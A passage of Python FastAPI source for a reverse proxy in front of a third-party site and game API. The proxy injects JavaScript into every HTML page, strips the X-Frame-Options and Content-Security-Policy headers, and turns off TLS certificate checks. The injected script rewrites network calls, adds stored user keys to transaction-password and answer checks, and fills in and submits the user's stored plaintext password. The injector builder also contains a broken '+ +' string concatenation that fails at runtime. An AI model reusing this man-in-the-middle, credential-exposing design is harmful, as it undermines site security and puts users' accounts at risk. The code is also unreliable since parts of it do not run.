UM==='object'?UM:{};window.userkey=UK||'';if(window.APP&&APP.USER){APP.USER.MODEL=UM&&typeof UM==='object'?Object.assign({},UM):{};}}try{var cur=new URL(location.href);if(cur.pathname.indexOf(P+'/pages/')===0&&cur.searchParams.get('bs')){cur.searchParams.delete('bs');history.replaceState(null,'',cur.pathname+cur.search+cur.hash);}}catch(__e){}}catch(_e){}"
        "try{(function(){if(window.__akBsRouteTrace)return;window.__akBsRouteTrace=1;var LH=location.href;function nu(u,b){try{return new URL(String(u||''),b||location.href);}catch(__e){return null;}}function tr(k,o,n){try{var x=nu(n,o),p=nu(o);if(!x||x.pathname.indexOf(P+'/pages/')!==0)return;var obs=p?(p.searchParams.get('bs')||''):'';var nbs=x.searchParams.get('bs')||'';if(o===n&&obs===nbs)return;console.warn('[AkBsRouteTrace]',{kind:k,oldUrl:String(o||''),newUrl:x.pathname+x.search+x.hash,currentB:B,newBs:nbs,stack:String(new Error().stack||'').slice(0,400)});}catch(__e){}}function sync(k){try{var cur=location.href;if(cur!==LH){tr(k||'href-change',LH,cur);LH=cur;}}catch(__e){}}try{var hp=history.pushState;if(hp&&!hp.__akBsTraceWrapped){var wp=function(){var o=location.href,r=hp.apply(history,arguments);var a=arguments.length>2?String(arguments[2]||location.href):location.href;tr('pushState',o,a);sync('pushState:after');return r;};wp.__akBsTraceWrapped=1;history.pushState=wp;}}catch(__e){}try{var hr=history.replaceState;if(hr&&!hr.__akBsTraceWrapped){var wr=function(){var o=location.href,r=hr.apply(history,arguments);var a=arguments.length>2?String(arguments[2]||location.href):location.href;tr('replaceState',o,a);sync('replaceState:after');return r;};wr.__akBsTraceWrapped=1;history.replaceState=wr;}}catch(__e){}try{var la=location.assign;if(la&&!la.__akBsTraceWrapped){location.assign=function(u){tr('location.assign',location.href,u);return la.call(location,u);};location.assign.__akBsTraceWrapped=1;}}catch(__e){}try{var lr=location.replace;if(lr&&!lr.__akBsTraceWrapped){location.replace=function(u){tr('location.replace',location.href,u);return lr.call(location,u);};location.replace.__akBsTraceWrapped=1;}}catch(__e){}try{window.addEventListener('popstate',function(){setTimeout(function(){sync('popstate');},0);},true);}catch(__e){}window.__akBsRouteTraceTimer=setInterval(function(){sync('interval');},100);})();}catch(_e){}"
        "try{(function(){if(window.__akConfigWatchdog)return;var syncConfig=function(){try{if(window.APP&&APP.CONFIG){APP.CONFIG.BASE_URL='/admin/ak-rpc/';if(Object.prototype.hasOwnProperty.call(APP.CONFIG,'API_URL'))APP.CONFIG.API_URL='/admin/ak-rpc/';if(Object.prototype.hasOwnProperty.call(APP.CONFIG,'BASE_Shunt'))APP.CONFIG.BASE_Shunt='/admin/ak-rpc/';return true;}}catch(__e){}return false;};syncConfig();window.__akConfigWatchdog=setInterval(syncConfig,100);})();}catch(_e){}"
        "try{(function(){if(window.__akUserModelWatchdog)return;var syncUserModel=function(){try{if(!HA)return false;if(window.APP&&APP.USER){APP.USER.MODEL=UM&&typeof UM==='object'?Object.assign({},UM):{};return true;}}catch(__e){}return false;};syncUserModel();window.__akUserModelWatchdog=setInterval(syncUserModel,100);})();}catch(_e){}"
        "try{(function(){if(window.__akRpcRewrite)return;window.__akRpcRewrite=1;function rwRpc(u){try{var x=new URL(String(u||''),location.href),p=(x.pathname||'');if(x.origin!==location.origin)return String(u||'');if(p.indexOf('/admin/ak-rpc/')===0)return x.pathname+x.search+x.hash;if(p.indexOf('/RPC/')!==0)return String(u||'');x.pathname='/admin/ak-rpc/'+p.slice(5);return x.pathname+x.search+x.hash;}catch(__e){var s=String(u||'');if(s.indexOf('/RPC/')===0){return '/admin/ak-rpc/'+s.slice(5);}return s;}}function _needsAuth(u){return (u.indexOf('Public_EP_SellRecords')>=0)||(u.indexOf('Question_Get')>=0)||(u.indexOf('Check_TransactionPassword')>=0)||(u.indexOf('Check_Answer')>=0)||(u.indexOf('Logout')>=0);}function _getAuth(){try{var m=(window.APP&&APP.USER&&APP.USER.MODEL&&typeof APP.USER.MODEL==='object'&&APP.USER.MODEL.Key)?APP.USER.MODEL:(UM&&typeof UM==='object'?UM:{});var k=m.Key||m.key||UK||'';var uid=m.Id||m.id||'';return{key:k?String(k):'',userId:uid?String(uid):''};}catch(__e){return{key:'',userId:''};}}var xo=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(method,url){var rw=rwRpc(url);this.__akUrl=rw;this.__akNeedsAuth=_needsAuth(String(url||''))||_needsAuth(rw);return xo.apply(this,[method,rw].concat([].slice.call(arguments,2)));};var xs=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(body){if(this.__akNeedsAuth&&(typeof body==='string'||body==null)){try{var bs2=typeof body==='string'?body:'';var auth=_getAuth();if(auth.key||auth.userId){var parts=bs2?bs2.split('&'):[];var d={};for(var i=0;i<parts.length;i++){var eq=parts[i].indexOf('=');if(eq>=0)d[parts[i].slice(0,eq)]=parts[i].slice(eq+1);}var chg=false;if(auth.key&&(!d['key']||d['key']==='123')){d['key']=encodeURIComponent(auth.key);chg=true;}if(auth.userId&&(!d['UserID']||d['UserID']==='123')){d['UserID']=encodeURIComponent(auth.userId);chg=true;}if(chg){var out=[];for(var kk in d){if(Object.prototype.hasOwnProperty.call(d,kk))out.push(kk+'='+d[kk]);}body=out.join('&');}}}catch(__e){}}return xs.call(this,body);};if(typeof window.fetch==='function'){var of=window.fetch;window.fetch=function(input,init){var url='',method='GET';try{if(typeof input==='string'){url=input;method=(init&&init.method)||'GET';}else if(input&&typeof input==='object'){url=input.url||'';method=(init&&init.method)||(input.method)||'GET';}}catch(__e){}var rw=rwRpc(url||'');if(rw!==url&&typeof input==='string'){input=rw;}else if(rw!==url&&input&&typeof input==='object'){input=new Request(rw,input);}return of.call(this,input,init);};}})();}catch(_e){}"
        "try{(function(){if(window.__akAjaxRewriteWatchdog)return;function needTrace(u){return (u.indexOf('RPC/')>=0)||(u.indexOf('Public_ACE')>=0)||(u.indexOf('Public_EP_SellRecords1')>=0)||(u.indexOf('Public_EP_SellRecords2')>=0)||(u.indexOf('Public_EP_SellRecords3')>=0)||(u.indexOf('Public_StockPrice')>=0)||(u.indexOf('Question_Get1')>=0)||(u.indexOf('Check_TransactionPassword')>=0)||(u.indexOf('Check_Answer')>=0)||(u.indexOf('Logout')>=0);}function needsAuth(u){return (u.indexOf('Public_EP_SellRecords1')>=0)||(u.indexOf('Public_EP_SellRecords2')>=0)||(u.indexOf('Public_EP_SellRecords3')>=0)||(u.indexOf('Question_Get1')>=0)||(u.indexOf('Check_TransactionPassword')>=0)||(u.indexOf('Check_Answer')>=0)||(u.indexOf('Logout')>=0);}function getAuth(){try{var m=(window.APP&&APP.USER&&APP.USER.MODEL&&typeof APP.USER.MODEL==='object')?APP.USER.MODEL:(window.USER_MODEL&&typeof window.USER_MODEL==='object'?window.USER_MODEL:(UM&&typeof UM==='object'?UM:{}));var lr=(LR&&typeof LR==='object')?LR:{};var ud=(lr.UserData&&typeof lr.UserData==='object')?lr.UserData:{};var key=(m.Key||m.key||UK||lr.Key||'');var userId=(m.Id||m.id||ud.Id||'');return {key:key?String(key):'',userId:userId?String(userId):''};}catch(__e){return {key:'',userId:''};}}function rwAjax(u){var s=String(u||'');try{if(/^[A-Za-z][A-Za-z0-9_]*$/.test(s)){return RPC+s;}var x=new URL(s,location.href),p=(x.pathname||'');if(x.origin===location.origin&&p.indexOf('/admin/ak-rpc/')===0){return x.pathname+x.search+x.hash;}if(x.origin===location.origin&&p.indexOf('/RPC/')===0){x.pathname='/admin/ak-rpc/'+p.slice(5);return x.pathname+x.search+x.hash;}}catch(__e){if(s.indexOf('/RPC/')===0){return '/admin/ak-rpc/'+s.slice(5);}}return s;}function wrapAjax(){try{if(!window.APP||!APP.GLOBAL||typeof APP.GLOBAL.ajax!=='function')return false;var cur=APP.GLOBAL.ajax;if(cur&&cur.__akAjaxRewriteWrapped)return true;var wrapped=function(options){if(!options||typeof options!=='object')return cur.apply(this,arguments);var opt=Object.assign({},options),before=opt.url||opt.api||'';var after=rwAjax(before);if(after!==before){opt.url=after;if(opt.api)delete opt.api;}if(needTrace(before)||needTrace(after)){console.warn('[AkAjaxRewrite]',{before:before,after:after});}if(needsAuth(after)){var auth=getAuth();var data=opt.data;if(typeof data==='string'||data==null){var raw=typeof data==='string'?data:'';var parts=raw?raw.split('&'):[];var d={};for(var i=0;i<parts.length;i++){var eq=parts[i].indexOf('=');if(eq>=0)d[parts[i].slice(0,eq)]=parts[i].slice(eq+1);}var chg=false;if(auth.key&&(!d['key']||d['key']==='123')){d['key']=encodeURIComponent(auth.key);chg=true;}if(auth.userId&&(!d['UserID']||d['UserID']==='123')){d['UserID']=encodeURIComponent(auth.userId);chg=true;}if(chg){var arr=[];for(var k in d){if(Object.prototype.hasOwnProperty.call(d,k))arr.push(k+'='+d[k]);}opt.data=arr.join('&');}}}return cur.call(this,opt);};wrapped.__akAjaxRewriteWrapped=1;APP.GLOBAL.ajax=wrapped;return true;}catch(__e){return false;}}wrapAjax();window.__akAjaxRewriteWatchdog=setInterval(wrapAjax,100);})();}catch(_e){}"
        "try{(function(){if(window.__akTabBarJumpWatchdog)return;function normTabUrl(u){try{var s=String(u||'');if(!s||s==='#')return s;var x=new URL(s,location.href),p=(x.pathname||'');if(x.origin!==location.origin)return s;var lp=(p||'').toLowerCase();if(lp.indexOf('/pages/')<0||lp.slice(-5)!=='.html')return s;x.searchParams.delete('bs');return x.pathname+x.search+x.hash;}catch(__e){return String(u||'');}}function getVm(n){try{return (n&&(n.__vue__||(n.__vueParentComponent&&n.__vueParentComponent.proxy)))||null;}catch(__e){return null;}}function wrapVm(vm){try{if(!vm||typeof vm.jump!=='function')return false;var cur=vm.jump;if(cur&&cur.__akTabBarJumpWrapped)return true;var wrapped=function(item){var next=item&&typeof item==='object'?Object.assign({},item):item;if(next&&typeof next==='object'&&next.url)next.url=normTabUrl(next.url);return cur.call(this,next);};wrapped.__akTabBarJumpWrapped=1;vm.jump=wrapped;if(vm.$options&&vm.$options.methods&&typeof vm.$options.methods.jump==='function')vm.$options.methods.jump=wrapped;return true;}catch(__e){return false;}}function ensureTabBarJump(){try{var root=document.getElementById('bottom');if(!root)return false;var nodes=[root].concat([].slice.call(root.querySelectorAll('*'))),hit=false;for(var i=0;i<nodes.length;i++){hit=wrapVm(getVm(nodes[i]))||hit;}return hit;}catch(__e){return false;}}ensureTabBarJump();window.__akTabBarJumpWatchdog=setInterval(ensureTabBarJump,100);})();}catch(_e){}"
        "try{(function(){if(window.__akGotoLoginWatchdog)return;var ensureAkGotoLogin=function(){try{if(!window.APP||!APP.GLOBAL||typeof APP.GLOBAL.gotoLogin!=='function')return false;var cur=APP.GLOBAL.gotoLogin;if(cur&&cur.__akGotoLoginWrapped)return true;var wrapped=function(){window.location=P+'/pages/account/login.html';};wrapped.__akGotoLoginWrapped=1;APP.GLOBAL.gotoLogin=wrapped;return true;}catch(__e){return false;}};ensureAkGotoLogin();window.__akGotoLoginWatchdog=setInterval(ensureAkGotoLogin,100);})();}catch(_e){}"
        "try{(function(){if(window.__akAbsoluteRpcRewrite)return;window.__akAbsoluteRpcRewrite=1;function rwAbs(u){try{var s=String(u||'');if(!s)return s;var x=new URL(s,location.href),p=(x.pathname||'');if(p.indexOf('/RPC/')!==0)return s;return '/admin/ak-rpc/'+p.slice(5)+x.search+x.hash;}catch(__e){var s2=String(u||'');if(s2.indexOf('/RPC/')===0)return '/admin/ak-rpc/'+s2.slice(5);return s2;}}var xo=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(method,url){var ru=rwAbs(url);return xo.apply(this,[method,ru].concat([].slice.call(arguments,2)));};if(typeof window.fetch==='function'){var of=window.fetch;window.fetch=function(input,init){var url='';try{if(typeof input==='string'){url=input;}else if(input&&typeof input==='object'){url=input.url||'';}}catch(__e){}var ru=rwAbs(url||'');if(ru!==url&&typeof input==='string'){input=ru;}else if(ru!==url&&input&&typeof input==='object'){input=new Request(ru,input);}return of.call(this,input,init);};}function wrapAjax(){try{if(!window.APP||!APP.GLOBAL||typeof APP.GLOBAL.ajax!=='function')return false;var cur=APP.GLOBAL.ajax;if(cur&&cur.__akAbsoluteRpcWrapped)return true;var wrapped=function(options){if(!options||typeof options!=='object')return cur.apply(this,arguments);var opt=Object.assign({},options),before=opt.url||opt.api||'';var after=rwAbs(before);if(after!==before){opt.url=after;if(opt.api)delete opt.api;}return cur.call(this,opt);};wrapped.__akAbsoluteRpcWrapped=1;APP.GLOBAL.ajax=wrapped;return true;}catch(__e){return false;}}wrapAjax();window.__akAbsoluteRpcTimer=setInterval(wrapAjax,100);})();}catch(_e){}"
        + auto_login +
        "})();</script>"
    )
    return js


def _build_native_rpc_auth_patch(userkey: str = "", user_id: str = "") -> str:
    protected_paths_json = json.dumps([
        "Public_EP_SellRecords1",
        "Public_EP_SellRecords2",
        "Public_EP_SellRecords3",
        "Question_Get1",
        "Check_TransactionPassword",
        "Check_Answer",
        "Logout",
    ], ensure_ascii=False)
    return (
        "try{(function(){if(window.__akNativeRpcAuthWatchdog)return;"
        "var PATHS=" + protected_paths_json + ";"
        "var UK=" + json.dumps(userkey or "", ensure_ascii=False) + ";"
        "var UID=" + json.dumps(user_id or "", ensure_ascii=False) + ";"
        "function bad(v){var s=String(v==null?'':v).trim().toLowerCase();return !s||s==='123'||s==='undefined'||s==='null';}"
        "function auth(){try{var m=(window.APP&&APP.USER&&APP.USER.MODEL&&typeof APP.USER.MODEL==='object')?APP.USER.MODEL:{};return{key:String(UK||m.Key||m.key||''),userId:String(UID||m.Id||m.id||'')};}catch(__e){return{key:String(UK||''),userId:String(UID||'')};}}"
        "function nameOf(u){try{var s=String(u||'');if(/^[A-Za-z][A-Za-z0-9_]*$/.test(s))return s.toLowerCase();var x=new URL(s,location.href),p=(x.pathname||'').replace(/^\\/RPC\\//i,'');if(p.indexOf('/')>=0)p=p.split('/').pop();return String(p||'').toLowerCase();}catch(__e){var s2=String(u||'');var m=s2.match(/([A-Za-z0-9_]+)(?:\\?|$)/);return m?String(m[1]).toLowerCase():s2.toLowerCase();}}"
        "function need(u){var n=nameOf(u);for(var i=0;i<PATHS.length;i++){if(n===String(PATHS[i]).toLowerCase())return true;}return false;}"
        "function fix(d){var a=auth();if(!a.key&&!a.userId)return d;if(d==null)d={};if(typeof d==='string'){try{var ps=new URLSearchParams(d),chg=false;var k=ps.get('key');var uid=ps.get('UserID')||ps.get('userid');if(a.key&&bad(k)){ps.set('key',a.key);chg=true;}if(a.userId&&bad(uid)){ps.set('UserID',a.userId);if(ps.has('userid'))ps.delete('userid');chg=true;}return chg?ps.toString():d;}catch(__e){return d;}}if(typeof URLSearchParams!=='undefined'&&d instanceof URLSearchParams){var chg2=false;var k2=d.get('key');var uid2=d.get('UserID')||d.get('userid');if(a.key&&bad(k2)){d.set('key',a.key);chg2=true;}if(a.userId&&bad(uid2)){d.set('UserID',a.userId);if(d.has('userid'))d.delete('userid');chg2=true;}return d;}if(typeof d!=='object'||Array.isArray(d))return d;var out=Object.assign({},d),chg3=false;var k3=out.key;var uid3=out.UserID!=null?out.UserID:out.userid;if(a.key&&bad(k3)){out.key=a.key;chg3=true;}if(a.userId&&bad(uid3)){out.UserID=a.userId;if(Object.prototype.hasOwnProperty.call(out,'userid'))delete out.userid;chg3=true;}return chg3?out:d;}"
        "function wrap(){try{if(!window.APP||!APP.GLOBAL||typeof APP.GLOBAL.ajax!=='function')return false;var cur=APP.GLOBAL.ajax;if(cur&&cur.__akNativeRpcAuthWrapped)return true;var wrapped=function(options){if(!options||typeof options!=='object')return cur.apply(this,arguments);var before=options.url||options.api||'';if(!need(before))return cur.apply(this,arguments);var opt=Object.assign({},options);if(Object.prototype.hasOwnProperty.call(opt,'data'))opt.data=fix(opt.data);else opt.data=fix({});return cur.call(this,opt);};wrapped.__akNativeRpcAuthWrapped=1;APP.GLOBAL.ajax=wrapped;return true;}catch(__e){return false;}}"
        "wrap();window.__akNativeRpcAuthWatchdog=setInterval(wrap,100);})();}catch(_e){}"
    )


def _build_native_injector(username: str = "", password: str = "", userkey: str = "", login_result: dict = None) -> str:
    safe_user = username.replace("\\", "\\\\").replace("'", "\\'")
    safe_pwd = password.replace("\\", "\\\\").replace("'", "\\'")
    auth_patch = _build_native_rpc_auth_patch(userkey, _extract_login_user_id(login_result or {}))
    auto_login = ""
    if safe_user and safe_pwd:
        auto_login = (
            "var _t=0,_iv=setInterval(function(){"
            "if(++_t>100){clearInterval(_iv);return;}"
            "if(typeof _vue!=='undefined'&&_vue&&_vue.form&&!_vue.isLogin){"
            "clearInterval(_iv);"
            "_vue.form.account='" + safe_user + "';"
            "_vue.form.password='" + safe_pwd + "';"
            "setTimeout(function(){"
            "_vue.checkInput&&_vue.checkInput();"
            "try{if(typeof _vue.login==='function'){_vue.login();return;}if(typeof _vue.Login==='function'){_vue.Login();return;}if(typeof _vue.submit==='function'){_vue.submit();return;}if(typeof _vue.onSubmit==='function'){_vue.onSubmit();return;}}catch(_e){}"
            "var _btn=document.querySelector('button[type=submit],.login-btn,.btn-login,.el-button--primary');if(_btn){_btn.click();}"
            "},200);"
            "}"
            "},100);"
        )
    return (
        "<script>(function(){"
        "if('serviceWorker' in navigator){navigator.serviceWorker.register=function(){return Promise.reject(new Error('SW disabled'));};}"
        + auth_patch +
        + auto_login +
        "})();</script>"
    )


def _build_ak_site_forward_headers(request: Request) -> dict:
    user_agent = request.headers.get("user-agent") or (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    )
    headers = {
        "User-Agent": user_agent,
        "Accept": request.headers.get("accept") or "*/*",
        "Accept-Language": request.headers.get("accept-language") or "zh-CN,zh;q=0.9",
    }
    if request.headers.get("content-type"):
        headers["Content-Type"] = request.headers["content-type"]
    return headers
@app.api_route("/admin/ak-site/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"])
@app.api_route("/admin/ak-web/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"])
@app.api_route("/ak-web/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"])
async def ak_web_proxy(request: Request, path: str):
    """AK 网页透明代理：所有请求通过后端转发，携带缓存 session，注入 JS 拦截器实现 VPN 式体验"""
    request_path = request.url.path
    if request_path.startswith(_AK_SITE_PREFIX):
        site_prefix = _AK_SITE_PREFIX
    elif request_path.startswith(_AK_NATIVE_WEB_PREFIX):
        site_prefix = _AK_NATIVE_WEB_PREFIX
    else:
        site_prefix = _AK_WEB_PREFIX
    if path.lstrip("/") == "cdn-cgi/rum":
        return Response(status_code=204)
    bs_id, session, bs_source = _resolve_browse_session(
        request, source_order=("cookie",)
    )
    referer = request.headers.get("referer", "")
    fetch_dest = request.headers.get("sec-fetch-dest", "")
    accept = request.headers.get("accept", "")
    cookie_bs = (request.cookies.get(_BROWSE_SESSION_COOKIE) or "").strip()
    cookies = {}
    selected_exit = None
    if session:
        cookies = session["cookies"]
        pinned_exit_name = str(session.get("ak_exit_name") or "").strip()
        if _ADMIN_AK_FORCE_DIRECT:
            selected_exit = _get_direct_exit()
            session.pop("ak_exit_name", None)
            logger.warning(
                f"[AkWebExit/{path}] force_direct=1 preferred={pinned_exit_name or '-'} using={selected_exit.name} "
                f"bs={bs_id} referer={referer}"
            )
        else:
            selected_exit = _select_forward_exit(path or "web", preferred_exit_name=pinned_exit_name)
            if pinned_exit_name:
                logger.warning(
                    f"[AkWebExit/{path}] pinned=1 preferred={pinned_exit_name} using={selected_exit.name} "
                    f"bs={bs_id} referer={referer}"
                )
            else:
                session["ak_exit_name"] = selected_exit.name
                logger.warning(
                    f"[AkWebExit/{path}] bind={selected_exit.name} bs={bs_id} referer={referer}"
                )

    normalized_path = path.lstrip("/").lower()
    requested_bs = (request.query_params.get("bs") or "").strip()
    if request.method == "GET" and normalized_path.startswith("pages/") and normalized_path.endswith(".html"):
        logger.warning(
            f"[AkPageEntry/{path}] requested_bs={requested_bs or '-'} resolved_bs={bs_id or '-'} "
            f"has_session={int(bool(session))} source={bs_source} cookie_bs={cookie_bs or '-'} referer={referer}"
        )
    if request.method == "GET" and normalized_path.startswith("pages/") and normalized_path.endswith(".html") and requested_bs:
        canonical_query = [(k, v) for k, v in request.query_params.multi_items() if k != "bs"]
        canonical_url = request.url.path
        if canonical_query:
            canonical_url += "?" + urlencode(canonical_query, doseq=True)
        logger.warning(
            f"[AkPageBsStrip/{path}] requested_bs={requested_bs or '-'} resolved_bs={bs_id or '-'} "
            f"source={bs_source} cookie_bs={cookie_bs} referer={referer} redirect={canonical_url}"
        )
        response = _apply_no_store_headers(Response(status_code=307, headers={"location": canonical_url}))
        if bs_id:
            _set_browse_session_cookie(response, bs_id)
        return response

    # 构建目标 URL（去掉代理专用参数 bs）
    query_parts = [p for p in str(request.url.query).split("&") if p and not p.startswith("bs=")]
    target_url = f"{_AK_BASE}/{path}" if path else f"{_AK_BASE}/"
    if query_parts:
        target_url += "?" + "&".join(query_parts)

    # 透传浏览器请求头，补充缺失的字段，模拟真实 Chrome 指纹
    fwd_headers = _build_ak_site_forward_headers(request)

    try:
        body = await request.body()
        client_kwargs = {"verify": False, "timeout": 20, "cookies": cookies}
        if selected_exit and selected_exit.proxy_url:
            client_kwargs["proxy"] = selected_exit.proxy_url
        async with httpx.AsyncClient(**client_kwargs) as client:
            resp = await client.request(
                method=request.method,
                url=target_url,
                headers=fwd_headers,
                content=body or None,
                follow_redirects=True,
            )
        logger.warning(f"[AkWebProxy] target={target_url} httpx_status={resp.status_code} final_url={resp.url}")
        final_url_str = str(resp.url)
        if "/pages/account/login.html" in final_url_str and "/pages/account/login.html" not in target_url:
            history_chain = " -> ".join(str(item.url) for item in resp.history) if resp.history else ""
            logger.warning(f"[AkWebLoginBounce/{path}] bs={bs_id} source={bs_source} cookie_bs={cookie_bs} referer={referer} target={target_url} final_url={final_url_str} history={history_chain}")

        # 同步响应中的 Set-Cookie 到缓存 session，保持 session 刷新
        if session and bs_id:
            for sc in resp.headers.get_list("set-cookie"):
                kv = sc.split(";", 1)[0].strip()
                if "=" in kv:
                    ck, cv = kv.split("=", 1)
                    session["cookies"][ck.strip()] = cv.strip()
            if resp.headers.get_list("set-cookie") and session.get("username"):
                try:
                    await db.save_ak_auth_state(
                        session.get("username", ""),
                        userkey=session.get("userkey", ""),
                        cookies=session.get("cookies", {}),
                        login_payload=session.get("login_result", {}),
                        ttl_seconds=_BROWSE_SESSION_TTL,
                    )
                except Exception as e:
                    logger.warning(f"[AkWebProxy] 站点登录态持久化失败 {session.get('username','')}: {e}")

        # 过滤阻止 iframe 嵌入和影响解压的响应头
        skip_headers = {"x-frame-options", "content-security-policy", "x-xss-protection",
                        "content-encoding", "transfer-encoding", "content-length"}
        resp_headers = {k: v for k, v in resp.headers.items() if k.lower() not in skip_headers}

        content = resp.content
        content_type = resp.headers.get("content-type", "")
        if fetch_dest == "script" and "application/json" in content_type.lower():
            body_head = content[:200].decode("utf-8", errors="replace")
            logger.warning(f"[AkSiteProxy/{path}] script_json_mismatch bs={bs_id} source={bs_source} cookie_bs={cookie_bs} referer={referer} target={target_url} final_url={resp.url} body_head={body_head}")
        if "application/json" in content_type.lower():
            body_head = content[:300].decode("utf-8", errors="replace")
            lowered_body = body_head.lower()
            normalized_body = lowered_body.replace(" ", "")
            if "用戶未登錄" in body_head or '"islogin":false' in normalized_body or '"error":true' in normalized_body:
                logger.warning(f"[AkSiteJsonLoginReject/{path}] bs={bs_id} source={bs_source} cookie_bs={cookie_bs} referer={referer} dest={fetch_dest} accept={accept} target={target_url} final_url={resp.url} body_head={body_head}")

        if path.lower().endswith("base.js") and any(t in content_type.lower() for t in ("javascript", "ecmascript")):
            text = content.decode("utf-8", errors="replace")
            if _use_native_ak_rpc(site_prefix):
                text, base_js_rewritten = _rewrite_base_js_native_rpc_roots(text)
            else:
                text, base_js_rewritten = _inject_base_js_no_login_probe(text)
            if base_js_rewritten:
                logger.warning(f"[AkBaseJsRewrite/{path}] bs={bs_id} source={bs_source} cookie_bs={cookie_bs} referer={referer} target={target_url} final_url={resp.url}")
                content = text.encode("utf-8")

        # 对文本内容（HTML/CSS）做 URL 替换 + HTML 注入拦截器
        if any(t in content_type for t in ("text/html", "text/css")):
            text = content.decode("utf-8", errors="replace")
            # 替换 AK 网页绝对 URL 为当前代理路径
            for base in [_AK_BASE, "https://ak928.vip", "http://ak928.vip",
                             "https://www.ak928.vip", "https://k937.com", "http://k937.com"]:
                text = text.replace(base + "/", site_prefix + "/")
                text = text.replace(base + '"', site_prefix + '"')
                text = text.replace(base + "'", site_prefix + "'")
            if "text/html" in content_type:
                html_injected = False
                text = _rewrite_site_html_roots(text, site_prefix)
                text = _rewrite_site_css_roots(text, site_prefix)
            # HTML：注入 JS 拦截器
            if "text/html" in content_type and bs_id:
                _sess = _browse_sessions.get(bs_id, {})
                if _use_native_ak_rpc(site_prefix):
                    injector = _build_native_injector(_sess.get("username", ""), _sess.get("password", ""), _sess.get("userkey", ""), _sess.get("login_result", {}))
                else:
                    injector = _build_injector(bs_id, _sess.get("username", ""), _sess.get("password", ""), _sess.get("userkey", ""), _sess.get("login_result", {}), site_prefix=site_prefix)
                if "<head>" in text:
                    text = text.replace("<head>", "<head>" + injector, 1)
                elif "<head " in text:
                    idx = text.index("<head ")
                    ins = text.index(">", idx) + 1
                    text = text[:ins] + injector + text[ins:]
                elif "<body" in text:
                    text = text.replace("<body", injector + "<body", 1)
                else:
                    text = injector + text
                html_injected = True
            if "text/html" in content_type:
                inject_reason = "ok" if html_injected else ("no_bs" if not bs_id else "miss")
                logger.warning(f"[AkHtmlInject/{path}] bs={bs_id or '-'} source={bs_source} cookie_bs={cookie_bs} reason={inject_reason} injected={int(html_injected)} referer={referer} target={target_url} final_url={resp.url} content_type={content_type}")
            content = text.encode("utf-8")

        response = Response(content=content, status_code=resp.status_code,
                            headers=resp_headers, media_type=content_type or "application/octet-stream")
        if "text/html" in content_type and normalized_path.startswith("pages/") and normalized_path.endswith(".html"):
            _apply_no_store_headers(response)
        if bs_id:
            _set_browse_session_cookie(response, bs_id)
        return response
    except Exception as e:
        logger.error(f"[AkWebProxy] {path}: {e}")
        return Response(content=f"代理错误: {str(e)}".encode(), status_code=502)


# ===== 启动 =====

def main():

    """启动透明代理服务器"""

    print("=" * 60)

    print("  AK 透明代理服务器")

    print("=" * 60)

    print(f"  监听地址: http://{PROXY_HOST}:{PROXY_PORT}")

    print(f"  API目标:  {AKAPI_URL}")

    print(f"  中央监控: {MONITOR_SERVER or '未配置'}")

    print(f"  本地封禁: {'启用' if ENABLE_LOCAL_BAN else '禁用'}")

    print(f"  PostgreSQL: {DB_HOST}:{DB_PORT}/{DB_NAME} (pool={DB_MIN_POOL}-{DB_MAX_POOL})")

    print("=" * 60)

    print()

    print("  使用方式:")

    print(f"  将游戏客户端的API地址改为: http://你的IP:{PROXY_PORT}/RPC/")

    print(f"  或本机使用: http://127.0.0.1:{PROXY_PORT}/RPC/")

    print()

    print(f"  状态页面: http://127.0.0.1:{PROXY_PORT}/")

    print(f"  状态API:  http://127.0.0.1:{PROXY_PORT}/api/status")

    print("=" * 60)

    

    uvicorn.run(app, host=PROXY_HOST, port=PROXY_PORT, log_level="warning")





if __name__ == "__main__":

    main()

